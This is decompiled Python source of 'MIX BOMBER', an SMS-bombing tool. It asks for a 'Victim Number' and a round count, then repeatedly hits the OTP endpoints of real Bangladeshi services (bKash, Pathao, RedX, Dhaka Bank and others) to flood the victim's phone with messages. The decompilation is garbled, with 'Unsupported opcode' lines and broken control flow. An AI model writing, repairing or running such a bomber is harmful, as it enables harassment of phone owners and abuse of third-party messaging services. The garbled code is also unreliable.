# Source Generated with ShoaibxAmer Pycdc
# File: bomber.pyc (Python 3.12)
# Decoded By: DARK LMNx9 (t.me/x_LMNx9)

Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
from rich.console import Console
from rich.progress import SpinnerColumn, TextColumn, Progress
from rich.text import Text
import requests
from requests.structures import CaseInsensitiveDict
import time
import os
import sys
from pyfiglet import Figlet
from termcolor import colored
sys.stdout.write('\x1b[1;35m\x1b]2;[🇧🇩] MIX BOMBER BD][🇧🇩]\x07')
console = Console()
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from pyfiglet import Figlet
import os
import platform
import getpass
import time
from rich.panel import Panel
from rich.align import Align
from rich.console import Group
import socket
import sys
import time
from rich.console import Console
console = Console()

def check_internet():
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
    socket.create_connection(('8.8.8.8', 53), timeout = 3)
    return True
    if OSError:
        return False

console.status('[bold yellow]Checking Internet connection...[/bold yellow]', spinner = 'arc')
time.sleep(2)
if not check_internet():
    console.print('\n[bold red][✘] No Internet Connection! Please connect to internet.[/bold red]\n', justify = 'center')
    time.sleep(3)
    sys.exit()
console.print('\n[bold green][✔] Internet connection is active.[/bold green]\n', justify = 'center')
time.sleep(0.3)
None(None, None)
import platform
import getpass
import time
import os
import socket
import requests
from rich.console import Console, Group
from rich.panel import Panel
from rich.align import Align
from pyfiglet import Figlet
console = Console()

def get_ip_info():
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: SWAP
Unsupported opcode: COPY
Unsupported opcode: RERAISE
    ip = requests.get('https://api.ipify.org').text
    geo = requests.get(f'''https://ipinfo.io/{ip}/json''').json()
    return {
        'ip': ip,
        'country': geo.get('country', 'N/A'),
        'city': geo.get('city', 'N/A'),
        'timezone': geo.get('timezone', 'N/A'),
        'online': True }
    return {
        'ip': 'Unavailable',
        'country': 'Unavailable',
        'city': 'Unavailable',
        'timezone': 'Unavailable',
        'online': False }


def welcome_screen():
Unsupported opcode: LOAD_FAST_AND_CLEAR
Unsupported opcode: SWAP
Unsupported opcode: SWAP
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: END_FOR
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: SWAP
Unsupported opcode: SWAP
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
    os.system('clear')
    user = getpass.getuser()
    system = platform.system()
    release = platform.release()
    python_version = platform.python_version()
    ip_info = get_ip_info()
    f = Figlet(font = 'slant')
    ascii_art = f.renderText('WELCOME')
    if ip_info['online']:
        pass
    welcome_text = f'''{user}[/green]!\n[bold yellow]🖥️ OS:[/bold yellow] {system} {release}\n[bold yellow]🐍 Python Version:[/bold yellow] {python_version}\n[bold yellow]🌐 IP Address:[/bold yellow] {ip_info['ip']}\n[bold yellow]🗺️ Location:[/bold yellow] {ip_info['city']}, {ip_info['country']}\n[bold yellow]🕒 Timezone:[/bold yellow] {ip_info['timezone']}\n[bold yellow]📶 Network:[/bold yellow] [green]Online[/green]{'[red]Offline[/red]'}\n[bold yellow]💬 Massage:[/bold yellow] Welcome to MIX-BOMBER\n'''
    group = Group(Align.center(f'''[bold magenta]{ascii_art}[/bold magenta]'''), Align.center(welcome_text))
    panel = Panel.fit(group, border_style = 'cyan', title = '＜ System Info ＞', padding = (1, 4))
    console.print(panel, justify = 'center')
    for n in []:
        tasks = range(1, 2000)[f'''task {n}''']
        n = range(1, 2000)
        console.print('', justify = 'center', end = '')
        status = console.status('[bold purple][/bold purple]', spinner = 'aesthetic', spinner_style = 'bold cyan')
        if tasks:
            console.print('', justify = 'center', end = '')
            task = tasks.pop(0)
            time.sleep(0.001)
            if tasks:
                pass
    None(None, None)
    return None
    '\n[bold cyan]👋 Welcome, [green]'
    n = None
    if not None:
        pass

welcome_screen()

def animated_header():
    os.system('clear')
    console = Console()
    f = Figlet(font = 'doom')
    ascii_banner = f.renderText('B.C.S    MIX-BOMBER')
    header_text = f'''[red]{ascii_banner}[/red]\n[bold green]Developer : SHONCHOYON BARUA ADIRTTA [Team B.C.S][/bold green]\n[bold blue]🔥 ONE OF THE MOST POWERFUL BEAST TOOL 🔥[/bold blue]'''
    panel = Panel.fit(Align.center(header_text, vertical = 'middle'), border_style = 'yellow', title = '💣 MIX BOMBER 💣', padding = (1, 4))
    console.print(panel, justify = 'center')

animated_header()

def send_all_apis(number, amount):
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: END_FOR
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: END_FOR
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: COPY
Unsupported opcode: RERAISE
    console.print(f'''[bold red]\n  Starting SMS Bombing for +88{number}[/bold red]\n''')
    apis = [
        {
            'name': '1 OTP Request',
            'method': 'post',
            'url': 'https://api.bkash.com/api/v1.0-beta/customer/auth/otp/request',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"mobileNumber":"' + number + '"}' },
        {
            'name': '2 OTP Request',
            'method': 'post',
            'url': 'https://api.redx.com.bd/api/v1/login',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"phone":"' + number + '"}' },
        {
            'name': '3 OTP Request',
            'method': 'post',
            'url': 'https://api.pathao.com/v2/customer/auth/send-otp',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"mobile":"' + number + '"}' },
        {
            'name': '4 OTP Request',
            'method': 'post',
            'url': 'https://bd.jobs/api/v1/mobile/otp/request',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"phone":"' + number + '"}' },
        {
            'name': '5 OTP Request',
            'method': 'post',
            'url': 'https://api.ajkerdeal.com/api/v3/customer/send-otp',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"mobile":"' + number + '"}' },
        {
            'name': '6 OTP Request',
            'method': 'post',
            'url': 'https://shopicruit.myshopify.com/admin/api/2021-01/customers.json',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"customer": {"phone": "' + number + '"}}' },
        {
            'name': '7 OTP Request',
            'method': 'post',
            'url': 'https://www.shohoz.com/api/v1/user/send-otp',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"phone":"' + number + '"}' },
        {
            'name': '8 API Request',
            'method': 'get',
            'url': f'''https://dzsmscall-abu-rashids-projects.vercel.app/api/test?phone={number}''' },
        {
            'name': '9 OTP Request',
            'method': 'get',
            'url': f'''https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}''' },
        {
            'name': '10 OTP Request',
            'method': 'post',
            'url': 'https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"mobileNumber": "' + number + '"}' },
        {
            'name': '11 OTP Request',
            'method': 'post',
            'url': 'https://developer.quizgiri.xyz/api/v2.0/send-otp',
            'headers': {
                'Content-Type': 'application/json' },
            'data': '{"phone":"' + number + '","country_code":"+880","fcm_token":null}' }]
    progress = Progress(SpinnerColumn(), TextColumn('[progress.description]{task.description}'), transient = True)
    task = progress.add_task('[cyan] Sending SMS requests...', total = amount)
    count = 0
    for _ in range(amount):
        for api in apis:
            if api['method'] == 'post':
                res = requests.post(api['url'], headers = api.get('headers', { }), data = api.get('data', ''))
            res = requests.get(api['url'])
            console.print(f'''  [bold yellow][{api['name']}][/bold yellow] Status Code: [bold green]{res.status_code}[/bold green]''')
            time.sleep(0.5)
            count += 1
            progress.update(task, advance = 1)
            None(None, None)
            console.print('\n[bold magenta] All requested SMS APIs have been called.[/bold magenta]')
            return None
            if Exception:
                e = None
                console.print(f''' [bold red][{api['name']}][/bold red] Error: {e}''')
                e = None
                del e
                e = None
                del e
    if not None:
        pass

from rich.panel import Panel
from rich.prompt import Prompt
if __name__ == '__main__':
    input_panel = Panel.fit("\n[bold yellow]📱 Enter phone number without country code (e.g. 0171234**78)[/bold yellow]\n\n[bold cyan]🔁 Amount 1 means call all APIs one time[/bold cyan]\n\n[bold red]⚠️ Please don't use this for any harmful work[/bold red]", title = '〘 Victim Input Panel 〙', border_style = 'magenta')
    console.print(input_panel, justify = 'center')
    user_number = Prompt.ask('[bold green]\n\n  Enter Victim Number[/bold green] [bold cyan]☰⫸[bold white]').strip()
    amount_str = Prompt.ask('[bold green]\n  Enter amount of rounds (e.g. 3)[/bold green] [bold cyan]☰⫸[bold white]').strip()
    if user_number.isdigit() and len(user_number) == 11:
        amount = int(amount_str)
        if amount < 1:
            raise ValueError
        send_all_apis(user_number, amount)
        return None
    console.print('[bold red]❌ Invalid number format! Please enter 11 digit number without country code.[/bold red]')
    return None
return None
if not None:
    pass
if ValueError:
    console.print('[bold red]❌ Invalid amount entered! Please enter a positive integer.[/bold red]')
    return None
